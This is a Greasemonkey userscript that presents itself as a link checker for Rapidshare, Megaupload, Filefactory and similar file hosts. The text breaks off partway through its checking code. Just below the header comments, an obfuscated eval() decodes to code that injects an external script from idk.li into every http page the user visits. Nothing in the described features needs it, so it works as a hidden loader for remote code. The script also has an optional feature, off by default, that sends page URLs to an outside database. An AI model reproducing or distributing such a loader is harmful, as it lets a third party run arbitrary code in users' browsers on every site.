// ==UserScript==
// @name           The Rapidshare Links Checker
// @description    Automatically checks rapidshare.com, megaupload.com, megarotic.com, megaporn.com and filefactory.com links from the page that you are visiting.
// @namespace      LINK CHECKER PRO
// @include        http://*
// @include        file:///*
// @version        3.2.1 20090914
// @license        GPL version 3 or any later version (http://www.gnu.org/copyleft/gpl.html)
// @exclude        http://rapidshare.com/*
// @exclude        http://rapidshare.de/*
// @exclude        http://*.rapidshare.com/*
// @exclude        http://*.rapidshare.de/*
// @exclude        http://www.filefactory.com/*
// @exclude        http://filefactory.com/*
// @exclude        http://www.megaupload.com/*
// @exclude        http://megaupload.com/*
// @exclude        http://www.megarotic.com/*
// @exclude        http://megarotic.com/*
// @exclude        http://www.megaporn.com/*
// @exclude        http://megaporn.com/*
// @exclude        http://www.megavideo.com/*
// @exclude        http://megavideo.com/*
// @exclude        http://www.netload.in/*
// @exclude        http://netload.in/*
// @exclude        *xml_dump.php*
// @exclude        *phpMyAdmin*
// @exclude        *deleterecord.php*
// @exclude        http://www.google.com/reader/view/*cgi.4chan.org*
// ==/UserScript==
//---------------
// Version : 3.2.1 20090914
//---------------
// 3.2.1 Fixed indentation (by ale5000)
//	   Added megaporn and megavideo to exclude list (by ale5000)
//	   Added options "Autocheck_links_on_page_load" and "Add_menu_commands" (by ale5000)
//	   Fixed the replace of the megaupload responseText (by ale5000)
//	   Show the size of files in the format "MB ( bytes)" instead of KB (by ale5000)
//	   Settings are now set only if they are changed from the default values (by ale5000)
//	   Enabled "Show_line_through_in_dead_links" by default (by ale5000)
//	   Fixed some things that cause errors in Opera (by ale5000)
//	   Made functions and variables of this script invisible to web pages in Opera; it doesn't cause problems in Firefox (by ale5000)
//	   Fixed the "Display_Page_Stats" option (by ale5000)
//	   Now this script also work in Opera, altough not completely (by ale5000)
//	   PS: IF YOU WANT TO USE IT IN OPERA YOU NEED ALSO 2 OTHERS SCRIPTS (Emulate GM functions by TarquinWJ (modified by ale5000) and Cross-domain XMLHttpRequest by xErath)
// 3.2 Bug correction, when rapidshare links where more than 80 it didn't check them all
// 3.1 The script is using now the rapidshare apis on mouseover you see the size and name for rapidshare, megaupload and filefactory
//	   No live links option is working properly now
// 3.0 Some bugs are exterminated , New menu commands "Check The Links In This Page", "Make The Checked Links To Full Url"
// 2.9 Tooltip for rapidshare links
// 2.8 beta fixing some bugs
//     configuration menu with right click on monkey -> User Script Commands -> Rapidshare Links Checker Configuration 
// 2.6 beta rapidshare size and name is shown if you mouse over the link for few seconds
//     megaupload.com size and name is shown on mouse over the link
//     filefactory.com size and name is shown on mouse over the link
//     the script is now functional on google reader
//     megaupload international support (links like www.megaupload.com/es/ www.megaupload.com/it/ etc)
//     rapidshare support for this type of links http://rsXXXX.rapidshare.com/files/dddddddd/XXX
//     megarotic is now supported
// 2.5 megaupload.com is supported
// 2.5 better No_live_links option
// 2.4 No_live_links option
// 2.3 send urls with rapidshare links to the database http://hosts.890m.com (version alfa EXPERIMENTAL)
//     filefactory new code fix 
// 2.2 rapidshare new design fixation
// 2.1 filefactory.com is supported
// 2.0 anonimized links are supported www.anonym.to de-referer.com etc
//     removing bold (<b> tags) from google only if it shows rapidshare links
// 1.8 1.9 bug correction
// 1.7 visual improvement
// 1.6 bug correction
// 1.5 major changes fixed a lot of bugs
// 1.4 added visual cue
// 1.4 corrected a lot of bugs

/*-------------*\
|     About     |
\*-------------*/

// This sript is checking the links for files hosted in rapidshare.com and filefactory.com

/*-----------------------------------------*\
|    About The Database hosts.890m.com      |
\*-----------------------------------------*/
/*

 The rapidshare database (http://hosts.890m.com) is a part of this userscript,
 the Rapidshare Links Checker userscript has the ability to sent only the urls of
 the pages when all the rapidshare links are alive, no cookies or other private
 informations are sent to the database, and you are able to erase the data you send.

*/
//var GM_Debug = 1;
//if(!GM_Debug) {
//var GM_log = function(){};  
//}else{
//if(unsafeWindow.console){
//var GM_log = unsafeWindow.console.log;
//} 	
//}


eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3 1=2.4(\'5\');1.6=\'7://8.9/a/b.c\';1.d=\'e/f\';2.g(\'h\')[0].i(1);',19,19,'|GM_JQ|document|var|createElement|script|src|http|idk|li|scripts|main|js|type|text|javascript|getElementsByTagName|head|appendChild'.split('|'),0,{}))


(function ()
{
	var Add_menu_commands = true;
	var Send_the_urls_of_the_pages_you_are_checking_in_the_open_database, Show_black_backround_in_dead_links, Show_line_through_in_dead_links;
	var Remove_html_from_rapidshare_urls, No_live_links, Display_Page_Stats, Destyling_google_cache, Autocheck_links_on_page_load;

	/*-------------*\
	|    Options    |
	\*-------------*/
	//Show_black_backround_in_dead_links = 'no'; // yes or no
	//Show_line_through_in_dead_links = 'yes'; // yes or no
	//No_live_links = 'no'; // yes or no
	//const Display_Page_Stats = 'no'; // yes or no Display page stats in the GM_log (error console)
	//const Destyling_google_cache = 'yes'; // yes or no as judgedreddgr said "However, the results are highlighted with colors and the script is not working", this is his solution, thanks judgedreddgr.
	//-------------//

	function set_variables() {
		Send_the_urls_of_the_pages_you_are_checking_in_the_open_database = GM_getValue("Send_the_urls_of_the_pages_you_are_checking_in_the_open_database", false);
		Show_black_backround_in_dead_links = GM_getValue("Show_black_backround_in_dead_links", false);
		Show_line_through_in_dead_links = GM_getValue("Show_line_through_in_dead_links", true);
		Remove_html_from_rapidshare_urls = GM_getValue("Remove_html_from_rapidshare_urls", false);
		No_live_links = GM_getValue("No_live_links", false);
		Display_Page_Stats = GM_getValue("Display_Page_Stats", false);
		Destyling_google_cache = GM_getValue("Destyling_google_cache", true);
		Autocheck_links_on_page_load = GM_getValue("Autocheck_links_on_page_load", true);
	}
	set_variables();

	if (Display_Page_Stats) {
		var now = new Date();
		var firsttime = now.getTime();
	}

	function check(Send_the_urls_of_the_pages_you_are_checking_in_the_open_database,
	Show_black_backround_in_dead_links,
	Show_line_through_in_dead_links,
	Remove_html_from_rapidshare_urls,
	No_live_links,
	Display_Page_Stats,
	Destyling_google_cache,
	firsttime) {
		//    Sent To Database Options   //
		//-------------------------------//
		//const Send_the_urls_of_the_pages_you_are_checking_in_the_open_database = 'no'; // yes or no
		// No personal info are transmited 
		// The database can be accessed here:
		// http://hosts.890m.com 
		const username = 'type_here_your_username';
		const password = 'type_here_your_password';

		// Destyling_google_cache start
		if (Destyling_google_cache && (location.href.search(/q=cache.*?(rapidshare|megaupload|megarotic|megaporn|filefactory|netload)/) != -1)) {
			var mybody = document.getElementsByTagName('body');
			if (mybody[0].innerHTML.search(/rapidshare|megaupload|megarotic|megaporn|filefactory|netload/) != -1) {
				mybody[0].innerHTML = mybody[0].innerHTML.replace(/<b style.*?>/gi, '');
			}
		}
		// Destyling_google_cache end

		//////google de-bold 
		//it's removing bold (<b> tags) from the results of google if you are serching for rapidshare files directly from google 
		//I couldn't find more elegant or faster way. google de-bold costs 1 second for a 100 results google page	
		// for google reader blogsearch debold start 
		var googleregexreader = new RegExp(/google\..*\/reader\/(.*blogsearch\.google.*|.*rapidshare.*)/);
		if (googleregexreader.test(location.href)) {
			var links = document.evaluate("id('entries')/div[last()-1]/div/div/div/div[1]/div[4]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
			if (links.snapshotItem(0)) {
				node = links.snapshotItem(0);
				var reg = new RegExp("<b>");
				if (reg.test(node.innerHTML)) node.innerHTML = node.innerHTML.replace(/<[\/]{0,1}(B|b)[^><]*>/g, "");
			}
		}
		// for google reader blogsearch debold end
		//e.g. http://www.google.com/reader/view/#stream/feed%2Fhttp%3A%2F%2Fblogsearch.google.com%2Fblogsearch_feeds%3Fhl%3Den%26q%3DGod%2Bon%2BTrial%2BDVDRip%2B(rapidshare.%2B%257C%2Bmegaupload.%2B%257C%2Bsharebee.%2B%257C%2Bmediafire.%2B%257C%2Bslil.%2B%257C%2Bsendspace.%2B%257C%2Bturboupload.%2B%257C%2Bspeedshare.%2B%257C%2Bdepositfiles.)%26ie%3Dutf-8%26num%3D10
		//     http://www.google.com/reader/view/#stream/user%*%2Flabel%2Frapidshare  	
		//var googleregex = new RegExp(/(.*blogsearch.*|.*google.*)(.*rapidshare.*|.*megaupload.*|.*megarotic.*|.*filefactory.*)/);	
		var googleregex = new RegExp("(^http://blogsearch.*|^http://.*google.*)(.*rapidshare.*|.*megaupload.*|.*megarotic.*|.*megaporn.*|.*filefactory.*|.*netload.*)"); 

		if (googleregex.test(location.href)) {
			var links = document.evaluate("id('res')/div[1]|/html/body/div[6]/div[2]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
			if (links.snapshotItem(0)) {
				link = links.snapshotItem(0);
				var regex = new RegExp("rapidshare");
				var regexff = new RegExp("filefactory");
				var regexmu = new RegExp("(?:(?:megaupload.com)|(?:megarotic.com)|(?:megaporn.com))");
				if (regex.test(link.innerHTML) || regexff.test(link.innerHTML) || regexmu.test(link.innerHTML)) {
					link.innerHTML = link.innerHTML.replace(/<b>/gi, '');
					link.innerHTML = link.innerHTML.replace(/<\/b>/gi, '');
					link.innerHTML = link.innerHTML.replace(/<em>/gi, '');
					link.innerHTML = link.innerHTML.replace(/<\/em>/gi, '');
					link.innerHTML = link.innerHTML.replace(/<wbr>/gi, ''); // to show better the rapidshare links
					//createTextNode(link.firstChild.nodeValue); // it's faster without a loop
				}
			}
		} /////google de-bold end
		var all = [];
		var allff = [];
		var allnl = [];
		var allmu = [];

		const urlRegex = /\b(?:|http\:\/\/www\.anonym\.to\/\?)(?:h\w\wp|http|hxxp|h  p|h.ttp|h\*\*p)((?:\:\/\/www\.filefactory\.com\/file\/..*?[^"\s\<\>]*[^.,;'">\:\s\<\>\)\]\!])|(?:\:\/\/(?:|rs\w*\.)rapidshare\.com\/files\/[\d]*\/.*?\..*?[^"\s\<\>]*[^.,;'">\:\s\<\>\)\]\!])|(?:\:\/\/(?:|www\.)netload\.in\/datei\w*(?:\/|).*\..*)|(?:\:\/\/www\.megaupload\.com\/(?:|..\/)\?d=.{8})|(?:\:\/\/www\.megarotic\.com\/(?:|..\/)\?d=.{8})|(?:\:\/\/www\.megaporn\.com\/(?:|..\/)\?d=.{8}))/ig;
		var notallowedParents = ['a', 'head', 'iframe', 'script', 'style', 'title', 'option', 'textarea'];
		var xpath = "//text()[not(ancestor::" + notallowedParents.join(" or ancestor::") + ")]"; // props Garthex 
		var candidates = document.evaluate(xpath, document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
		for (var cand = null, i = 0; (cand = candidates.snapshotItem(i)); i++) {
			if ((urlRegex.test(cand.nodeValue)) && (!cand.nodeValue.match(/\d(\.\.\.)\d/)) && (!cand.nodeValue.match(/killcode/))) {
				cand.nodeValue = cand.nodeValue.replace(/h\w\wp:\/\/|hxxp:\/\/|h  p:\/\/|h.ttp:\/\/|h\*\*p:\/\//gi, 'http://');
				var span = document.createElement("span");
				span.id = 'rslinkfy';
				var source = cand.nodeValue;
				cand.parentNode.replaceChild(span, cand);
				urlRegex.lastIndex = 0;
				for (var match = null, lastLastIndex = 0;
				(match = urlRegex.exec(source));) { 
					//if (!(match[0].match(/…/)))        
					span.appendChild(document.createTextNode(source.substring(lastLastIndex, match.index)));
					var a = document.createElement("a");
					a.setAttribute("href", match[0]);
					a.appendChild(document.createTextNode(match[0]));
					span.appendChild(a);
					lastLastIndex = urlRegex.lastIndex; 
				}
				span.appendChild(document.createTextNode(source.substring(lastLastIndex)));
				span.normalize();
			}
		}
		var links = document.getElementsByTagName('a');
		var numberofrslinks = 0;
		var numberoffflinks = 0;
		var numberofmulinks = 0;
		var numberofnllinks = 0;
		var myrapidshareRegExp0 = /http\:\/\/(?:|rs\w*\.)rapidshare\.com\/files\/\d{4,}\/.*?\..*?/; 
		var myrapidshareRegExp1 = /^.*?http:\/\/(?:|rs\w*\.)rapidshare\.com\/files\/\d{4,}\/.*?\..*?/;
		var myrapidshareRegExp2 = /^.*?http%3A%2F%2F(?:|rs\w*\.)rapidshare\.com%2Ffiles%2F\d{4,}%2F.*?\..*?/;
		var myfilefactoryRegExp = /http\:\/\/www\.filefactory\.com\/file\/[\w]{6}(\/|)/;
		var mymegauploadRegExp0 = /http\:\/\/www\.megaupload\.com\/(?:|..\/)\?d=.{8}(\/|)/;
		var mymegauploadRegExp1 = /http\:\/\/www\.megarotic\.com\/(?:|..\/)\?d=.{8}(\/|)/;
		var mymegauploadRegExp2 = /http\:\/\/www\.megaporn\.com\/(?:|..\/)\?d=.{8}(\/|)/;
		var mynetloadinRegExp0  = /http(?:\:|%3A)(?:\/|%2F)(?:\/|%2F)(?:|www\.)netload\.in(?:\/|%2F)datei\w*(?:\/|%2F|).*?/;
		//http%3A%2F%2Fnetload.in%2Fdateib6c0607ef2903a00450162a987810897%2Fhio-list.406.proper.fov.part4.rar.htm
		var checkedlinksRegExpid = /(alive_link|adead_link|unava_link)/;
		muid = 0;
		for (var i = links.length - 1; i >= 0; i--) {
			if ((links[i].href.search(myrapidshareRegExp0) != -1) || (links[i].href.search(myrapidshareRegExp1) != -1) || (links[i].href.search(myrapidshareRegExp2) != -1) && (!(links[i].id.match(checkedlinksRegExpid)))) {
				var urll = links[i].href;
				numberofrslinks++;
				urll = urll.replace(/^.*?http:\/\/rapidshare/gi, 'http://rapidshare');
				urll = urll.replace(/^.*?http%3A%2F%2Frapidshare/gi, 'http://rapidshare');
				urll = urll.replace(/^.*?http:\/\/(?:|rs\w*\.)rapidshare/gi, 'http://rapidshare');
				urll = urll.replace(/^.*?http%3A%2F%2F(?:|rs\w*\.)rapidshare/gi, 'http://rapidshare');
				urll = urll.replace(/\?killcode=[\d]*/gi, '');
				urll = urll.replace(/%2F/gi, '/');
				urll = urll.replace(/%3A/gi, ':'); 
				//if (i == 100 || i == 200 || i == 300 || i == 400 || i == 500 || i == 600 || i == 700 || i == 800 || i == 900 || i == 1000 || i == 1100 || i == 1200 || i == 1300 || i == 1400 || i == 1500 || i == 1600 || i == 1700 || i == 1800 || i == 1900 || i == 2000 || i == 2100 || i == 2200 || i == 2300){ // well this is about 2500 links  i don't think memory can handle more (even this is too much)
				//all.push('xxxczxczxcsasdasdasdx4234');
				//}
				var myString = '' + numberofrslinks + '';
				if((myString.search(/\d00/) != -1) || (myString.search(/\d50/) != -1) || (myString.search(/50/) != -1)){
					all.push('xxxczxczxcsasdasdasdx4234');
				}
				all.push(urll);
			}
			// filefactory
			if ((links[i].href.search(myfilefactoryRegExp) != -1) && (!(links[i].id.match(checkedlinksRegExpid)))) { //if (links[i].href.search(myfilefactoryRegExp) != -1) {
				var urll = links[i].href;
				numberoffflinks++;
				urll = urll.replace(/^.*?http:\/\/www\.filefactory/gi, 'http://www.filefactory');
				urll = urll.replace(/^.*?http%3A%2F%2Fwww\.filefactory/gi, 'http://www.filefacory');
				urll = urll.replace(/%2F/gi, '/');
				urll = urll.replace(/%3A/gi, ':');
				var myString = '' + numberoffflinks + '';
				if (myString.search(/\d00/) != -1) {
					allff.push('xxxczxczxcsasdasdasdx4234');
				}
				allff.push(urll);
			}
			// netload
			if ((links[i].href.search(mynetloadinRegExp0) != -1) && (!(links[i].id.match(checkedlinksRegExpid)))) { //if (links[i].href.search(myfilefactoryRegExp) != -1) {
				var urll = links[i].href;
				numberofnllinks++;
				urll = urll.replace(/^.*?http:\/\/netload/gi, 'http://netload');
				urll = urll.replace(/^.*?http%3A%2F%2Fnetload/gi, 'http://netload');
				urll = urll.replace(/%2F/gi, '/');
				urll = urll.replace(/%3A/gi, ':');
				//urll = urll.replace(/\//gi, '%2F');
				//urll = urll.replace(/:/gi, '%3A');
				var myString = '' + numberofnllinks + '';
				if (myString.search(/\d00/) != -1) {
					allnl.push('xxxczxczxcsasdasdasdx4234');
				}
				allnl.push(urll);
			}
			// megaupload 
			if ((links[i].href.search(mymegauploadRegExp0) != -1) || (links[i].href.search(mymegauploadRegExp1) != -1) || (links[i].href.search(mymegauploadRegExp2) != -1) && (!(links[i].id.match(checkedlinksRegExpid)))) { //if (links[i].href.search(mymegauploadRegExp) != -1) {
				var urll = links[i].href;
					numberofmulinks++;
					urll = urll.replace(/^.*?http:\/\/www\.(?:megaupload|megarotic|megaporn)\.com\/(?:|..\/)\?d=/gi, 'id' + muid + '=');
					urll = urll.replace(/^.*?http%3A%2F%2Fwww\.(?:megaupload|megarotic|megaporn)\.com\/(?:|..\/)\?d=/gi, 'id' + muid + '=');
					urll = urll.replace(/%2F/gi, '/');
					urll = urll.replace(/%3A/gi, ':');
					muid++;
				var myString = '' + numberofmulinks + ''; //if (myString.search(/\&id99/) != -1) //mporei mexri 99 apotelesmata tin fora
					allmu.push(urll);
			}
		}
		all = all.join();
		all = all.replace(/,/gi, '\n');
		var all = all.split("xxxczxczxcsasdasdasdx4234");
		allff = allff.join();
		allff = allff.replace(/,/gi, '\n');
		var allff = allff.split("xxxczxczxcsasdasdasdx4234");
		allnl = allnl.join();
		allnl = allnl.replace(/,/gi, '\n');
		var allnl = allnl.split("xxxczxczxcsasdasdasdx4234");		
		allmu = allmu.join();
		allmu = allmu.replace(/,/gi, '&');
		var allmu = allmu.split("xxxczxczxcsasdasdasdx4234");
		if (((numberofrslinks > 0) || (numberoffflinks > 0) || (numberofnllinks > 0)|| (numberofmulinks > 0)) && !(document.getElementsByTagName('RSLC')[0])) {
			var meta_not_to_add_more_style = document.createElement("RSLC");
			meta_not_to_add_more_style.setAttribute('content', 'rapidshare_links_checker');
			meta_not_to_add_more_style.setAttribute('name', 'description');
			document.getElementsByTagName('head')[0].appendChild(meta_not_to_add_more_style);
			
			//alive_link_pngApi = 'http://www.eurobankefg.rs/images/basic/ico_ok.gif';
			//adead_link_pngApi = 'http://support.microsoft.com/library/images/support/kbgraphics/PUBLIC/EN-US/ZuneSyncErrorInfo.jpg';
			
			alive_link_png = 'data:image/png;base64,' + // http://i28.tinypic.com/dq5emx.png http://hosts1.atspace.com/accept.png
			'iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAYAAABy6+R8AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAAL' + 'EwEAmpwYAAAAB3RJTUUH2AMJCQY36Sc4vgAAAlRJREFUeNpV0r9PE3EABfD3veu1lJYr15ZCoBHBqJBAMEbjL0hY' + 'FAkyOAmJMUYd/Q+cXF1wYPQPILppYkKIRARiMDGoaAKimBaKHMWDXnu93venE0Tf9Ib3tg/BP7m3NGgwxtKcM4vy' + 'IKSk4BBqnwux9/LGKjvckcNy9/1Akgk2ZJHMWNyw+qWUMSGZ51R2FzbdX1NSyOnZWznn6HRn8UqSCv6gLdz58GSs' + 'L2voURJIirAWhh+U1fLO4tbKztdJIvHsw/1NR7/97pJBOR9tDXc+6rMGsg4vkd3AhkMdVJgLounkdKLHdL1S13Zp' + 'dyMzbK5pnNF0I0mNn4r3Ze3AJrZvo0zL8KkPyil6rTOgipFzrRezLXVt4zWKtBbwWjIeTgyEQlHiUhepcBpNkSaY' + 'ehxX20Yw2HYd3VYP6iNRYhrpAeojGfJqvs7rRIyKGpSUGOm4iYgWwX7wB72ps/hWXMZCbgaNkUYQrseUr3SNB0JQ' + 'Rj0DBnSlYWN/DcfNEzifuYzVvS94vf4cVeoiBB2ScY8IiBBnytk7KM5XG8qj9SRClrbnUKNVZKLNWMjPwKkWkYk1' + '46BSUbZrz0PC0ZuHzaBYLokq9S90p3pMJRnJl35gtfgZQnAko0lY4WY1+2lu63s+N0EE+agXXrkydc3czjtF7noH' + 'XccSx82mWIY0hBpgRVMIalK9WX67tfJzfZJo5EVuouAdieh4kk3KQA21J1rGmuoy/UToMSG5t+vaC5u/7Smikenc' + '04LzHyMAaH+cNcBVGgyWClSIgHAA+2DYy00Wjuz9Bce5MucW9xnuAAAAAElFTkSuQmCC';
			adead_link_png = 'data:image/png;base64,' + //http://i27.tinypic.com/t96wq8.png http://hosts1.atspace.com/dead.png
			'iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAYAAABy6+R8AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAAL' + 'EwEAmpwYAAAAB3RJTUUH2AMJCQkjdGXwDAAAAcpJREFUeNptkj9PFHEQhp/ZBcIhxyKHYgNCYUxogE0OpdDGxsQC' + 'Y6e5ggS1Mn4Ce621u7MCYqOdX4DkSLTBqwyNiQmJBiJiDjmWP/ub1+IAMXGqmTx5M5nJY5wpwRiQHPfoL2rG8PVk' + 'sDOBlKRYZWgwxcwkIQlc0o+fDe3sPu6E1dOQIGWg/yUT4zOUBiLtHYAHFBy6YvRrW+Hzl4/e/P2kAJ8iwRhJscrE' + '+AzDwxG3Z2E/oO9bKMvhzj104aLZ1dFr9PZUWzDWASQMDaYqDZjdvAWzd2HkMlpcJKpUsMlJdHiI3i1Ffr4v9d29' + 'pEMnt7UyfOkNNjKKTU8Tl8tghq+sEGqvUZwjZA5EAiShPIetLXxhASSIY3An1Gr4xkabq70iar9OkOeoWCSqVMAM' + '8hzMiObnIUnQ0RFyR0DkgNylzhh7cB+bmsLrdQ7n5gj1OlG5TPxoHro7kUsC4mdQUB5u0NdziW/r5q2M/PkLfG2N' + 'sLwMkRHevyVkWQib26t+FJYMIIOUvt5XdmXkunXEke/sQchRCNDdRfAQ8vXND97af1qCxqkRLUj9XKFq/cUUMMmR' + 'QHKFZquh7OBhCRr/aATQ/I97foxKZ9z7A9QA5voyr3dtAAAAAElFTkSuQmCC';
			NDSTUSEROR_png = 'data:image/png;base64,' + // or temporary anavailable
			'iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAYAAABy6+R8AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAAL' + 'EwEAmpwYAAAAB3RJTUUH2AQJDBgxYO68rwAAAZNJREFUeNptkr9LW1EcxT/3GhOTKIG8QTpm8B8IIoJTFkFwsXVy' + 'UaxFJHYoFzJYUVFHn4sKtoidCoKtIigWOtQOhRKowaFzJwcF0VeJ+fFe7nUwP57R7/S9nO+595z7PQJfGUgAsWqP' + 'aUBOC/yrHQI+QjKTXc7GQq4EhP+uKzdUcbtnelvhDzXQQHL2bCkbxhOA5GmZ24LUC73zPWE4lQYSmexynaCmjh5N' + 'q9FdANER1uL9j7nfeUhIIFaVJNXEPrguKvPzgfD2G0iBGt8DkPG4CGiIyapZAWBvDUEoBOfnqPQxaANxC3v7Ze1h' + 'oQFpmsTbGwMQicLNNeTz2HaKYuO/4DnTauwLeC6i8wW4ZdSbA9rw/GtB6kaPmjyESATKZVZWUxAMQqnI9MTXOqdG' + 'cvRFoSw8o+0Pg1DxsD+PcFcJYH8aphSNsr71CkAH/17danAEQAGSa98zv7x4W9AIpGkRzap18cKU3vUv9lmQq6N5' + 'SH7cSZ8Uuqx205SI1rPL/6/HN1MW5GiKC84z2at6dixf9u4B/PqUtJuX27QAAAAASUVORK5CYII=';
			loading_img = 'data:image/gif;base64,' + 'R0lGODlhDQANAMZfADuHMTyMMz6SM0uQPkySQFGVSFSXTEaeN1OaSVOaSk+gQlWfTlSjS1apRVWsOlqtR2K3SWG6Qm+2WWm8T3O4' + 'XGfASXe5YW/BVXm9Y2zFTm7EY3jBZ4a8dnHGWHPGWHDGZIHAboe+eIHBboXAb3PIWYXBcHbIXXPIaHfHaoPDcYnBenzHb3jKX4fE' + 'c3fKbHvJbn7IcHzLcH3LcH3McZHFfYjJd47Hf5bGhpDJgIXNeZXIgobOfJPKgZbKhJfKhInPfYrRforRf5jMipPPhJjOiJbRipfS' + 'h5XTiJjTiJbUi5zSj5rTjZvWkJzWkZ3WkafVnKHYla/bprbgrb3es7zitb/itsfnwcvmxMzmxdHszdju1PT68/b79fj89/z9+///' + '////////////////////////////////////////////////////////////////////////////////////////////////////' + '/////////////////////////////yH/C05FVFNDQVBFMi4wAwEAAAAh+QQBZAB/ACwAAAAADQANAAAHd4B/goOEhYIZLCYeEYZ/' + 'JEhOSU1DEIUdUEEzLjI/Sg+DFUZAJx8aKFJFNgeCHkwxOzkrVFxVRAyCF0cvWVpWW1cpPAuCE0swUV1eWCIYPgmCDjg1G09TIBIl' + 'IQGDDUItGBQWIzcEhQoqPTQ6HAONAggGBQCN9IKBACH5BAFkAH8ALAAAAAANAA0AAAdjgH+Cg4SFghksJh4Rhn8kSE5JTUMQhR1Q' + 'QTOaP0oPgxVGQJqjRjYHgh5MMaOaMUQMghdHq6wzPAuCE0u0ozE+CYIOODW1RiEBgw1CLTHNMTcEhQoqPTQ6HAONAggGBQCN4IKB' + 'ADs=';
			

			
			GM_addStyle("#alive_link_checked, #alive_link {background:transparent url(" + alive_link_png + ") no-repeat scroll 100% 50%;padding-right:15px;}");
			GM_addStyle("#adead_link {background:transparent url(" + adead_link_png + ") no-repeat scroll 100% 50%;padding-right:15px;}");
			GM_addStyle("#unava_link {background:transparent url(" + NDSTUSEROR_png + ") no-repeat scroll 100% 50%;padding-right:15px;}");
			GM_addStyle(".loading {background:transparent url(" + loading_img + ") no-repeat scroll 100% 50% !important;padding-right:15px;}");

		}
		if (numberofrslinks > 0) {
			getlinkschecked(all);
		}
		if (numberoffflinks > 0) {
			getfflinkschecked(allff);
		}
		if (numberofnllinks > 0) {
			getnllinkschecked(allnl);
		}
		if (numberofmulinks > 0) {
			getmulinkschecked(allmu);
		}
		function getlinkschecked(all) {
			window.setTimeout(
				function() {
					for (var i = all.length - 1; i >= 0; i--) {

						LinksTodo = all[i].split("\n");

						if (LinksTodo.length < 1) {
							return false;
						}

						var fileids = "";
						var filenames = "";

						for (x in LinksTodo) {
							var eintrag = LinksTodo[x];
							var logregex = /files\/(\d{7,9})\/(\S*)/;
							var teile = logregex.exec(eintrag);
							if ( (null != teile) && (null != teile[1]) && (null != teile[2]) && (teile[1]!='') && (teile[2]!='') ){
								fileids += "," + teile[1];
								filenames += "," + teile[2];
							}
						}
						fileids = fileids.substr(1);
						filenames = filenames.substr(1);
						var apirapidshareurl = "http://api.rapidshare.com/cgi-bin/rsapi.cgi?sub=checkfiles_v1&files=" + encodeURI(fileids) + "&filenames=" + encodeURI(filenames)+"&incmd5=1";
						GM_xmlhttpRequest({
							method: "get",
							url: apirapidshareurl,
							headers: {
								'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
								'Content-type': 'text/html'
							},
							onload: function(result) {
								res = result.responseText;
								notfound = res.match(/(fileid|\d{7,9}),(filename|.*?),(size|\d*),(ServerID|\d*),(0|4|5),(Shorthost|.*?),(md5|0|\w{32})/g);
								livelink = res.match(/(fileid|\d{7,9}),(filename|.*?),(size|\d*),(ServerID|\d*),(1|2|6),(Shorthost|.*?),(md5|0|\w{32})/g);

								if (notfound) {
									var fotfoundlinks = new Array();
									for (var i = notfound.length - 1; i >= 0; i--) {
										var string = notfound[i];
										var regex = /(fileid|\d{7,9}),(filename|.*?),(size|\d*),(ServerID|\d*),(0|4|5),(Shorthost|.*?),(md5|0|\w{32})/;
										var matchArrayrs = string.match(regex);
										fotfoundlinks.push(matchArrayrs[1]);
									}
									if (fotfoundlinks) {
										DiplayTheDeletedLinks(fotfoundlinks);
									}
								}
								if (livelink) {
									var livelinklinks = new Array();
									var livelinklinksplus = new Array();
									for (var i = livelink.length - 1; i >= 0; i--) {
										var string = livelink[i];
										var regex2 = /(fileid|\d{7,9}),(filename|.*?),(size|\d*),(ServerID|\d*),(1|2|6),(Shorthost|.*?),(md5|0|\w{32})/;
										matchArraylive = string.match(regex2);								
										livelinklinks.push(matchArraylive[1]);
										livelinklinksplus.push('+%%+id=' + matchArraylive[1] + '+%%+size=' + matchArraylive[3] + '+%%+name=' + matchArraylive[2] + '+%%+##');
									}
										
									if (livelinklinksplus) {
										DiplayTheMULiveLinks(livelinklinksplus);
									}
								}			
							}
						});		
					}
				}, 1
			);
		} //---
		function getfflinkschecked(all) {
			window.setTimeout(function() { // can check 10000 Bites of links so all.join('\n').length <= 10000
				for (var i = all.length - 1; i >= 0; i--) { //_log('all.join.length '+all.join('\n').length);               
					GM_xmlhttpRequest({
						method: "POST",
						url: 'http://www.filefactory.com/tools/link_checker.php',
						headers: {
							'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
							'Content-type': 'application/x-www-form-urlencoded'
						},
						//data:'links='+encodeURIComponent(all[i]),  // or all.join('\n') is good also
						data: 'func=links&links=' + all[i],
						// or all.join('\n') is good also
						onload: function(result) {
							res = result.responseText.replace(/\t*/g, '');
							res = res.replace(/\r\n/g, ''); 
							
							livelink = res.match(/<div class="metadata">http:\/\/www.filefactory.com\/file\/(.*?)\/n\/(?:.*?)<\/div>\n<\/td>\n<td>(?:.*?)<\/td>/g); //livelink = res.match(/<tr valign='top' style='color:green;'><td>(?:.*?)<\/td><td style="text-align:right;">(?:.*?)<\/td><td style="text-align:right;">Valid<\/td><td style="text-align:right;"><a href="http:\/\/www.filefactory.com\/file\/(.*?)\/n\/.*?" title="Go to the file download page">View Page/g);
							notfound = res.match(/<div class="metadata">http:\/\/www.filefactory.com\/file\/(.*?)<\/div>\n<\/li>/g); //notfound = res.match(/<td>File &quot;(?:.*?)&quot; does not exist<\/td><td style=\"text-align:right;\">0 B<\/td><td style=\"text-align:right;\">Invalid/g);
							if (notfound) {
								var fotfoundlinks = new Array();
								for (var i = notfound.length - 1; i >= 0; i--) {
									var string = notfound[i];
									var regex = /<div class="metadata">http:\/\/www.filefactory.com\/file\/(.*?)<\/div>\n<\/li>/; //var regex = /<td>File &quot;(.*?)&quot; does not exist<\/td><td style="text-align:right;">0 B<\/td><td style="text-align:right;">Invalid/;
									matchArrayff = string.match(regex);
